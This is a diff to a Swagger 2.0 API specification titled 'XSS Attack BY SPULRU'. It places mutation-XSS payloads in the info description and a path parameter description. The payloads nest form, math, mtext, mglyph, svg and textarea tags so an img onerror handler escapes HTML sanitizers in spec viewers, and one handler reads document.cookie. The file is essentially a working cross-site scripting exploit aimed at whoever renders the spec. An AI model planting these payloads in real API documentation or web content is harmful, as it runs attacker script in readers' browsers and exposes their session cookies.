@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
   description: |
-    </p><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form><p>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+    
   version: production
 basePath: /JSSResource/
 produces:
@@ -28,6 +29,7 @@ paths:
       parameters:
         - description: |
             <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            
           format: int64
           in: path
           name: id
